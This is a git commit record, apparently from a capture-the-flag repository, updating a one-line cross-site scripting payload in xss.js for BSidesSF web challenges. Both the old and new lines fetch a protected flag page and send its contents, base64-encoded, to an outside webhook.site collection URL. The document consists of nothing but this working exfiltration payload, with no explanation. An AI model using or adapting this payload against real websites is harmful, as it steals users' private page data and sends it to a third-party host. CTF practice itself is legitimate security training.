10431f47cde9e60bf5e7f56fe0e0ae3b61fe4239
Super-Botman <79469126+Super-Botman@users.noreply.github.com>
2023-04-22 02:49:09 +0200

    Update xss.js
    update payload

--- xss.js
+++ xss.js
@@ -1,1 +1,1 @@
-fetch('https://web-tutorial-2-e3fd3da3.challenges.bsidessf.net/xss-two-flag').then(res=>res.text()).then(data=>fetch('https://webhook.site/be3e280b-cb6d-4dff-a420-03cd27c0ffb7/?body='+btoa(data)))
+fetch('https://web-tutorial-3-74cd9c56.challenges.bsidessf.net/xss-three-flag').then(res=>res.text()).then(data=>fetch('https://webhook.site/be3e280b-cb6d-4dff-a420-03cd27c0ffb7/?body='+btoa(data)))
